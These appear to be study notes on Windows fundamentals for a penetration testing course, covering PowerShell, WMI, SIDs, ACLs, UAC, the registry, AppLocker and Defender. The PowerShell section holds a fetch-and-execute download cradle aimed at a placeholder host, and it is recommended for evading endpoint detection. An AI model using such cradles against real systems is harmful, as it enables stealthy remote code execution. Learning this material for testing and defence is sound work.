| **Group**       | Associated security group                                                                         |
| **Access**      | List of users/groups and their allowed permissions (e.g., ReadKey, FullControl)                   |
| **Sddl**        | Security Descriptor Definition Language string — a full representation of the security descriptor |
| **SID entries** | Shows SIDs for application packages or unknown groups — not typically visible with `sc sdshow`    |

####  Benefits Over `sc`
- Displays both **friendly names** and **SIDs** for all security principals.
- Includes **ownership** and **group** details.
- Output is **structured and scriptable** — ideal for automation across multiple systems.
- Offers the full **SDDL string**, similar to `sc sdshow`, but easier to extract programmatically.

#### Summary
- Use `Get-Acl` to **script and scale** permission checks.
- It’s a **better alternative to GUI tools** for large environments or automated checks.
- Combine with `ForEach-Object`, `Export-Csv`, or `Out-File` for audits across services and systems.


### Windows Sessions

#### Interactive vs Non-Interactive Accounts in Windows

### **Interactive Logon**

- **Definition:** Initiated by a user providing credentials to access a local or domain system.
- **Methods of Initiation:**
    - Direct login via console (physical access).
    - Using `runas` for secondary logon.
    - Remote Desktop Protocol (RDP) sessions.

###  **Non-Interactive Accounts**

- **Definition:** Used by the OS to start services and tasks **without user interaction or credentials**.
- **Key Features:**
    - No password is required.
    - Automatically used by the system for background services, tasks, and processes.
    - Typically engaged at system boot.

###  Types of Non-Interactive Accounts

|Account Type|Description|
|---|---|
|**Local System Account**|`NT AUTHORITY\SYSTEM` – Most powerful account on the system; more privileged than local administrators; used for critical OS-level tasks and service management.|
|**Local Service Account**|`NT AUTHORITY\LocalService` – Limited privileges; similar to a local user; used to run services with restricted access.|
|**Network Service Account**|`NT AUTHORITY\NetworkService` – Also limited; similar to Local Service, but can **authenticate on the network** as the computer account.|

###  Use Cases
- **Interactive:** Human users logging in to perform tasks.
- **Non-Interactive:** System services (e.g., Windows Update, Scheduled Tasks, WMI).

The [Windows Command Reference](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) from Microsoft is a comprehensive A-Z command reference which includes an overview, usage examples, and command syntax for most Windows commands, and familiarity with it is recommended.

PowerShell is built on top of the .NET Framework, which is used for building and running applications on Windows. This makes it a very powerful tool for interfacing directly with the operating system.

PowerShell utilizes [cmdlets](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7), which are small single-function tools built into the shell. There are more than 100 core cmdlets, and many additional ones have been written, or we can author our own to perform more complex tasks. PowerShell also supports both simple and complex scripts used for system administration tasks, automation, and more.

### Running Scripts

The PowerShell ISE (Integrated Scripting Environment) allows users to write PowerShell scripts on the fly. It also has an autocomplete/lookup function for PowerShell commands. The PowerShell ISE allows us to write and run scripts in the same console, which allows for quick debugging.

This example demonstrates how an attacker, pen tester, or administrator can **leverage PowerShell scripts**—in this case, a **reconnaissance tool like PowerView.ps1**—to **interact with and enumerate information from the Windows operating system**, specifically **local groups**.


####  **Breakdown of the Example**

```Cmd
PS C:\htb> .\PowerView.ps1;Get-LocalGroup | fl
```
##### What's Happening:
- `.\PowerView.ps1`: This **loads and runs the PowerView PowerShell script**. PowerView is a PowerShell tool used for **Active Directory (AD) enumeration**.
- `;`: Semicolon separates two PowerShell commands.
- `Get-LocalGroup`: This is a **function within PowerView** (or a native cmdlet in newer versions of PowerShell/Windows). It **retrieves information about local groups** on the system.
- `| fl`: Stands for `Format-List` – it formats the output in a **list view** instead of table view, making it easier to read full property values.

####  **Why It's Useful**
Running PowerShell scripts like this allows users to **enumerate system information** such as:
- Which local groups exist (e.g., `Administrators`, `docker-users`)
- Group descriptions and names
- Security Identifiers (SIDs) – unique IDs used for security and permissions
- `PrincipalSource`: Indicates if the group is local or domain-based
- `ObjectClass`: Usually 'Group' in this context

This info is valuable for:
- **Red teamers** looking for privilege escalation paths
- **Defenders** monitoring suspicious script execution
- **IT admins** automating audits

####  **PowerShell Execution Contexts**
You can run these scripts in multiple ways:
- **Locally**, from disk: `.\PowerView.ps1` 
- **In-memory**, using download cradles (e.g., `IEX (New-Object Net.WebClient).DownloadString("http://example.com/PowerView.ps1")`)
    - This method avoids writing to disk → **stealthier**, **harder to detect**

####  **Real-World Context**
In penetration tests or red team ops:
- PowerView helps map out local and domain environments. 
- Getting group info reveals **privileged users**, **3rd-party integrations (like Docker/VMware)**, or **potential misconfigurations**.
- Running it through in-memory cradles or obfuscated techniques helps evade **endpoint detection and response (EDR)** tools.

One common way to work with a script in PowerShell is to import it so that all functions are then available within our current PowerShell console session: `Import-Module .\PowerView.ps1`. We can then either start a command and cycle through the options or type `Get-Module` to list all loaded modules and their associated commands.


#### Execution Policy

Sometimes we will find that we are unable to run scripts on a system. This is due to a security feature called the `execution policy`, which attempts to prevent the execution of malicious scripts. The possible policies are:

|**Policy**|**Description**|
|---|---|
|`AllSigned`|All scripts can run, but a trusted publisher must sign scripts and configuration files. This includes both remote and local scripts. We receive a prompt before running scripts signed by publishers that we have not yet listed as either trusted or untrusted.|
|`Bypass`|No scripts or configuration files are blocked, and the user receives no warnings or prompts.|
|`Default`|This sets the default execution policy, `Restricted` for Windows desktop machines and `RemoteSigned` for Windows servers.|
|`RemoteSigned`|Scripts can run but requires a digital signature on scripts that are downloaded from the internet. Digital signatures are not required for scripts that are written locally.|
|`Restricted`|This allows individual commands but does not allow scripts to be run. All script file types, including configuration files (`.ps1xml`), module script files (`.psm1`), and PowerShell profiles (`.ps1`) are blocked.|
|`Undefined`|No execution policy is set for the current scope. If the execution policy for ALL scopes is set to undefined, then the default execution policy of `Restricted` will be used.|
|`Unrestricted`|This is the default execution policy for non-Windows computers, and it cannot be changed. This policy allows for unsigned scripts to be run but warns the user before running scripts that are not from the local intranet zone.|

---

### Windows Management Instrumentation (WMI)

WMI is a subsystem of PowerShell that provides system administrators with powerful tools for system monitoring. The goal of WMI is to consolidate device and application management across corporate networks. WMI is a core part of the Windows operating system and has come pre-installed since Windows 2000. It is made up of the following components:

|**Component Name**|**Description**|
|---|---|
|WMI service|The Windows Management Instrumentation process, which runs automatically at boot and acts as an intermediary between WMI providers, the WMI repository, and managing applications.|
|Managed objects|Any logical or physical components that can be managed by WMI.|
|WMI providers|Objects that monitor events/data related to a specific object.|
|Classes|These are used by the WMI providers to pass data to the WMI service.|
|Methods|These are attached to classes and allow actions to be performed. For example, methods can be used to start/stop processes on remote machines.|
|WMI repository|A database that stores all static data related to WMI.|
|CIM Object Manager|The system that requests data from WMI providers and returns it to the application requesting it.|
|WMI API|Enables applications to access the WMI infrastructure.|
|WMI Consumer|Sends queries to objects via the CIM Object Manager.|

Some of the uses for WMI are:

- Status information for local/remote systems
- Configuring security settings on remote machines/applications
- Setting and changing user and group permissions
- Setting/modifying system properties
- Code execution
- Scheduling processes
- Setting up logging

WMIC uses aliases and associated verbs, adverbs, and switches. The above command example uses `LIST` to show data and the adverb `BRIEF` to provide just the core set of properties. An in-depth listing of verbs, switches, and adverbs is available [here](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic). WMI can be used with PowerShell by using the `Get-WmiObject` [module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1). This module is used to get instances of WMI classes or information about available classes. This module can be used against local or remote machines.

We can also use the `Invoke-WmiMethod` [module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/invoke-wmimethod?view=powershell-5.1), which is used to call the methods of WMI objects. A simple example is renaming a file. We can see that the command completed properly because the `ReturnValue` is set to 0.


### Microsoft Management Console (MMC)

- A framework to **centralize administrative tools** via _snap-ins_. 
- Available on all modern Windows systems since Windows Server 2000.

##### How to Open It
- **Start Menu → Type `mmc` → Press Enter**

##### Usage Flow
1. **Initial View**: Blank console (`Console Root`) 
2. **Add Snap-ins**:  
    `File → Add/Remove Snap-ins`  
    Choose tools like:
    - Services
    - Event Viewer
    - Group Policy Editor
    - Certificates

3. **Scope of Management**:    
    - **Local computer**
    - **Remote computer** (on same network/domain)



##### Save Your Configuration

- Save setup as `.msc` file (e.g., `management.msc`)
- Default location:  
    **Start Menu → Windows Administrative Tools**


**Snap-ins** are **modular components** (small programs or tools) that you can **add to the Microsoft Management Console (MMC)** to manage specific aspects of your Windows system.


- **MMC** = Empty toolbox
- **Snap-ins** = Individual tools you choose to place inside the toolbox based on what you need

Examples of Snap-ins:

|Snap-in Name|Purpose|
|---|---|
|**Services**|Manage and configure Windows services (start, stop, etc.)|
|**Event Viewer**|View system and application logs|
|**Local Users and Groups**|Manage local user accounts and groups|
|**Group Policy Object Editor**|Edit group policies for system control|
|**Device Manager**|View and manage hardware devices|
|**Certificates**|Manage certificates for users, computers, or services|
##### Why Use Snap-ins?

- Centralized management of Windows components
- Customizable interface for sysadmins
- Can manage local **or** remote systems

You can mix and match multiple snap-ins in a single MMC session and save that setup as a `.msc` file for future use.


### Windows Subsystem for Linux (WSL)

**WSL** lets you run Linux binaries natively on Windows without needing a dual-boot or full virtual machine.
#####  **WSL Versions**

|Version|Key Feature|
|---|---|
|**WSL 1**|Translates Linux syscalls into Windows equivalents|
|**WSL 2**|Runs an actual Linux kernel in a lightweight VM (uses Hyper-V)|

#####  **How to Install WSL (PowerShell as Admin)**

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```

For **WSL 2**, you’d also need to enable:

```Powershell
Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform
```

#####  **Launching Linux**

- After installing WSL and a distro (from Microsoft Store or manually), run: `bash` or `wsl`  

#####  **Filesystem Access**
- Linux root: `ls /` shows standard Linux directories    
- Windows drives (like C:): Accessible via `/mnt/c/`

#####  **Example**
```Bash
$ uname -a Linux WS01 4.4.0-18362-Microsoft #476-Microsoft ...
```
That shows you're running the WSL kernel under Windows.

---

## Desktop Experience vs. Server Core
**Windows Server Core Overview**
- Introduced in **Windows Server 2008**.
- A **minimalistic server environment** with only essential components.
- Lower **resource usage**: less disk space, RAM, and management overhead.
- Lacks a **full GUI**, but supports **basic graphical tools** like:
    - Registry Editor (`regedit`)
    - Notepad
    - Task Manager
    - PowerShell
    - System Information
    - Some Sysinternals tools (e.g., Process Explorer, TCPView)

**Configuration and Management**
- Uses **PowerShell**, **Command Line**, and **remote tools** (MMC, RSAT).  
- **SConfig** is a built-in script-based configuration utility.
    - Used for setting hostname, domain, networking, updates, etc.

**Limitations**
- Certain GUI tools and applications **cannot run**:
    - Server Manager     
    - Event Viewer (`eventvwr`)
    - MMC console (`mmc.exe`)
    - Disk Management (`diskmgmt.msc`)
    - Internet Explorer / Edge
    - SharePoint Server, SCVMM, Project Server, etc.

 **When to Use**
- Server Core is ideal when: 
    - Resource efficiency is important.
    - Security and reduced attack surface are priorities.
    - Admins are comfortable with **CLI and remote management**.

- Desktop Experience is preferred when:  
    - GUI tools are necessary.
    - Less experienced administrators will manage the server.

**Comparison Table** n

| **Application/Tool**              | **Server Core** | **Desktop Experience** |
| --------------------------------- | --------------- | ---------------------- |
| Command Prompt                    | Available       | Available              |
| PowerShell / .NET                 | Available       | Available              |
| Registry Editor (`regedit`)       | Available       | Available              |
| Disk Management (`diskmgmt.msc`)  | Not Available   | Available              |
| Server Manager                    | Not Available   | Available              |
| MMC (`mmc.exe`)                   | Not Available   | Available              |
| Event Viewer (`eventvwr`)         | Not Available   | Available              |
| Services Console (`services.msc`) | Not Available   | Available              |
| Control Panel                     | Not Available   | Available              |
| File Explorer                     | Not Available   | Available              |
| Task Manager                      | Available       | Available              |
| Internet Explorer / Edge          | Not Available   | Available              |
| Remote Desktop Services           | Available       | Available              |

## Windows Security
Windows systems contain many built-in applications, features, and settings that create a large attack surface. While patching helps mitigate vulnerabilities, misconfigurations can still lead to exploitation.

Over time, Microsoft has continued to:

- Harden the system with new security features.
- Improve detection and prevention capabilities.
- Reduce the risk of unauthorized access.

### **Security Principles**

Windows security focuses on:
- Controlling access and authentication for:
    - Users
    - Networked computers
    - Threads
    - Processes

- Minimizing unauthorized access risks.
- Preventing misuse by attackers or malicious software.

### **Security Identifier (SID)**
A **Security Identifier (SID)** is a unique value assigned to:
- Users
- Groups
- System accounts
- Other security principals

The system automatically generates SIDs to:

- Distinguish users (even if usernames are identical).
- Control access based on user permissions.

SIDs are stored in the system’s security database and are included in the user’s access token to authorize specific actions.


### **SID Structure**

The SID format consists of multiple components:

```Powershell
S-1-5-21-674899381-4069889467-2080702030-1002
```

|Component|Description|
|---|---|
|`S`|Identifies the string as a SID|
|`1`|**Revision Level** (always 1)|
|`5`|**Identifier Authority** (who created the SID)|
|`21`|**Subauthority1** (relation/group to authority)|
|`674899381-4069889467-2080702030`|**Subauthority2** (computer/domain info)|
|`1002`|**Relative ID (RID)** (distinguishes the specific account)|
 **Example Output**
Using the `whoami /user` command:


```powershell
USER INFORMATION ---------------- User Name           SID =================== ============================================= ws01\bob            S-1-5-21-674899381-4069889467-2080702030-1002`
```
This SID can be broken down to determine:

- The machine/domain where the account was created.
- The account type (normal user, admin, guest, etc.).

#### Security Accounts Manager (SAM) & Access Control

#### SAM
- The **Security Accounts Manager (SAM)** is a Windows service and database that stores:
    - Usernames
    - Password hashes
    - Security identifiers (SIDs)

- It plays a key role in **authenticating users** and **granting rights** to execute processes on the system.

#### Access Control Entries (ACE) and Access Control Lists (ACL)

- **ACLs** are lists used to manage access permissions for securable objects (files, folders, processes, etc.).
- Each **ACL** contains **Access Control Entries (ACEs)** which define:
    - Who (user, group, or process)
    - What kind of access (read, write, execute, etc.)

- There are two types of ACLs in Windows:

|Type|Description|
|---|---|
|**DACL (Discretionary ACL)**|Specifies who **is allowed or denied** access|
|**SACL (System ACL)**|Specifies **what actions are audited** (used for logging access attempts)|

#### Access Tokens & Authorization

- Every **process or thread** initiated by a user has an **access token**, which includes:
    - The user’s SID
    - Group memberships
    - Privileges
    - DACLs for the object being accessed

- These tokens are **validated by the Local Security Authority (LSA)** to determine what the process can or cannot do.
- This is critical for understanding **Windows privilege escalation**, especially when:
    - Exploiting misconfigured permissions
    - Leveraging token manipulation techniques

#### User Account Control (UAC)

- Designed to:
    - **Prevent unauthorized changes** to the system.
    - **Stop malware or scripts** from performing elevated operations silently.

#### Admin Approval Mode

- When an action requiring admin rights is initiated:
    - A **consent prompt** is shown.
    - If the user is not an administrator, it asks for **admin credentials**.

- This mechanism **interrupts the execution** of any binary/script until proper authorization is provided.

#### How UAC Works (Overview)

1. **User initiates a process.**
2. The process requests elevated privileges.
3. UAC evaluates the request:
    - If the user is an admin:
        - Show **Consent Prompt**
    - If the user is standard:
        - Show **Credential Prompt**
4. Only after user confirmation is the process allowed to run with elevated privileges.

![[Pasted image 20250425225302.png]]

#### Registry
#### Overview

- The **Windows Registry** is a **hierarchical database** used by Windows to store **configuration settings** and **options**.
- It contains **low-level system settings** for:
    - The operating system
    - Device drivers
    - Services
    - Security accounts
    - Installed applications

#### Accessing the Registry

- You can open the Registry Editor by:
    - Pressing `Win + R`, typing `regedit`, and hitting Enter
    - Searching for **"regedit"** in the Start Menu

#### Structure

- The Registry has a **tree structure** made up of:
    - **Root keys** (top-level folders)
    - **Subkeys** (subfolders)
    - **Values** (data entries)

#### Root Keys (Hives)

|Root Key|Description|
|---|---|
|`HKEY_CLASSES_ROOT`|File associations and COM object registration|
|`HKEY_CURRENT_USER`|User-specific settings (only for the logged-in user)|
|`HKEY_LOCAL_MACHINE`|Machine-wide settings (hardware, OS, software)|
|`HKEY_USERS`|All users' profiles on the system|
|`HKEY_CURRENT_CONFIG`|Hardware profile currently in use|

> Note: `HKEY_CURRENT_USER` and `HKEY_CURRENT_CONFIG` are **shortcuts/aliases** to paths under `HKEY_USERS` and `HKEY_LOCAL_MACHINE`.


#### Value Types
There are **11 value types**, but here are the most commonly used:

|**Value**|**Type**|
|---|---|
|REG_BINARY|Binary data in any form.|
|REG_DWORD|A 32-bit number.|
|REG_DWORD_LITTLE_ENDIAN|A 32-bit number in little-endian format. Windows is designed to run on little-endian computer architectures. Therefore, this value is defined as REG_DWORD in the Windows header files.|
|REG_DWORD_BIG_ENDIAN|A 32-bit number in big-endian format. Some UNIX systems support big-endian architectures.|
|REG_EXPAND_SZ|A null-terminated string that contains unexpanded references to environment variables (for example, "%PATH%"). It will be a Unicode or ANSI string depending on whether you use the Unicode or ANSI functions. To expand the environment variable references, use the [**ExpandEnvironmentStrings**](https://docs.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-expandenvironmentstringsa) function.|
|REG_LINK|A null-terminated Unicode string containing the target path of a symbolic link created by calling the [**RegCreateKeyEx**](https://docs.microsoft.com/en-us/windows/desktop/api/Winreg/nf-winreg-regcreatekeyexa) function with REG_OPTION_CREATE_LINK.|
|REG_MULTI_SZ|A sequence of null-terminated strings, terminated by an empty string (\0). The following is an example: _String1_\0_String2_\0_String3_\0_LastString_\0\0 The first \0 terminates the first string, the second to the last \0 terminates the last string, and the final \0 terminates the sequence. Note that the final terminator must be factored into the length of the string.|
|REG_NONE|No defined value type.|
|REG_QWORD|A 64-bit number.|
|REG_QWORD_LITTLE_ENDIAN|A 64-bit number in little-endian format. Windows is designed to run on little-endian computer architectures. Therefore, this value is defined as REG_QWORD in the Windows header files.|
|REG_SZ|A null-terminated string. This will be either a Unicode or an ANSI string, depending on whether you use the Unicode or ANSI functions.|

#### Example

If a DWORD value named `Analysis` is set to `0` under:

`HKEY_LOCAL_MACHINE\Software\ExampleKey`

It means a particular feature or setting is disabled (depending on what `Analysis` controls).

#### Security Note
- Misconfiguring or deleting keys/values in the Registry can cause **system instability or crashes**.
- Always back up the Registry or specific keys before making changes.
- Tools like `reg.exe` and PowerShell can also manipulate the Registry from the command line or scripts.

The entire system registry is stored in several files on the operating system. You can find these under `C:\Windows\System32\Config\`.
The user-specific registry hive (HKCU) is stored in the user folder (i.e., `C:\Users\<USERNAME>\Ntuser.dat`).

#### Run and RunOnce Registry Keys
These [Run and RunOnce registry keys](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys). are used to automatically launch programs:
- At **system startup** (`HKEY_LOCAL_MACHINE`)
- At **user login** (`HKEY_CURRENT_USER`)
- Either **every time** (`Run`) or **just once** (`RunOnce`)

They're often used for:
- Loading background applications (e.g., OneDrive, Docker, antivirus trays)
- **Persistence mechanisms** in malware or post-exploitation
- Temporary setup actions (e.g., software installers)

#### Key Paths

|Location|Path|
|---|---|
|Machine-wide (all users)|`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`|
|Current user only|`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`|
|Machine-wide (run once)|`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`|
|Current user (run once)|`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`|

#### Examples

**Querying HKLM Run:**

```powershell
PS C:\htb> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
```

**Sample Output:**



```powershell
SecurityHealth   REG_EXPAND_SZ   %windir%\system32\SecurityHealthSystray.exe RTHDVCPL         REG_SZ          "C:\Program Files\Realtek\Audio\HDA\RtkNGUI64.exe" -s Greenshot        REG_SZ          C:\Program Files\Greenshot\Greenshot.exe`
```

**Querying HKCU Run:**

```Powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
```

**Sample Output:**

```Powershell
OneDrive         REG_SZ   "C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background OPENVPN-GUI      REG_SZ   C:\Program Files\OpenVPN\bin\openvpn-gui.exe Docker Desktop   REG_SZ   C:\Program Files\Docker\Docker\Docker Desktop.exe`
```

#### Security/Forensics Insight

- These keys are common **autostart locations** checked during incident response.  
- Malware often creates entries here to **persist across reboots**.
- The `RunOnce` keys are **deleted automatically** after execution, but attackers can **re-add them** dynamically.

#### Application Whitelisting (AWL)
Application whitelisting is a **security control** that **only allows** explicitly approved software to execute on a system. Everything else is **blocked by default**.

> **Default-deny strategy** — aligns with the **Zero Trust** model.
- Prevent execution of unauthorized or malicious software.
- Enforce tighter control over what runs in the environment.
- Reduce risk of malware, fileless attacks, or unauthorized tools.

#### How It Works

AWL tools compare the app/executable against a **known-good list**, often defined by:
- File hashes
- Digital signatures
- Path or publisher rules
- Packaged application identity (AppLocker or WDAC in Windows)

#### Operational Flow
1. **Audit Mode First** — log everything that would be blocked without actually enforcing it.
2. Review logs to identify legitimate apps being flagged.
3. Refine and finalize whitelist rules.
4. Switch to **Enforcement Mode** to actively block unauthorized executions.

#### Whitelisting vs. Blacklisting

|Feature|Whitelisting|Blacklisting|
|---|---|---|
|Trust model|**Zero Trust** – deny all by default|Trust everything except what's blacklisted|
|Overhead|Initial setup is heavy, maintenance is lighter|Requires frequent updates|
|Security posture|High|Moderate|
|Risk|Missed app = functionality breakage|Missed threat = infection|
|Use case|High-security systems, servers|General desktops, less critical endpoints|
#### Tools That Support AWL

- Windows Defender Application Control (WDAC)
- AppLocker
- Carbon Black
- McAfee Application Control
- Symantec Endpoint Protection
- PowerShell Constrained Language Mode (limited form)

#### Industry Recommendations

- **NIST SP 800-167**: Recommends AWL in high-security and mission-critical environments.
- Used in **government**, **finance**, **SCADA/ICS**, and **defense sectors**.


#### AppLocker

AppLocker is Microsoft's built-in **application whitelisting solution**, introduced in **Windows 7**.

> Enables **granular control** over what users can run:

- Executables
- Scripts
- Windows Installer files
- DLLs
- Packaged apps & installers

#### Key Features
- Rules based on:
    - **Publisher (Digital Signature)**
    - **Product/File Name**
    - **Version**
    - **File Path**
    - **File Hash**

- Rules can target:
    - **Security groups**
    - **Individual users**

#### Deployment Strategy
- Start in **Audit Mode** → logs violations without enforcement
- Review impact and refine rules
- Shift to **Enforcement Mode** when stable

#### Local Group Policy

**Group Policy** allows configuration of system and user settings across local or domain environments.

> On **standalone systems**, this is called **Local Group Policy**.

- Access via: `gpedit.msc`
- Structure:
    - **Computer Configuration**
    - **User Configuration**

#### Use Cases
- Restrict application execution
- Enforce password policy
- Configure audit settings
- Enable features like **Credential Guard**  
    _(via: Turn On Virtualization Based Security)_

> Often used for **locking down individual machines** in high-security contexts.


### Windows Defender Antivirus

**Windows Defender Antivirus (Defender)** is Microsoft’s built-in antimalware solution.

> Initially a downloadable tool → Now integrated with Windows.

#### Core Features

- **Real-Time Protection**
- **Cloud-Delivered Protection**
- **Tamper Protection**
- **Controlled Folder Access** (Ransomware defense)
- **Automatic Sample Submission**

> Exclusion lists can be configured for **penetration testing tools** to avoid false positives.

#### Management

- Managed via **Windows Security Center**

```powershell
Get-MpComputerStatus | findstr "True"`
```    

#### Example Output
```powershell
AMServiceEnabled           : True   AntivirusEnabled           : True   RealTimeProtectionEnabled  : True   IsTamperProtected          : True`  
```

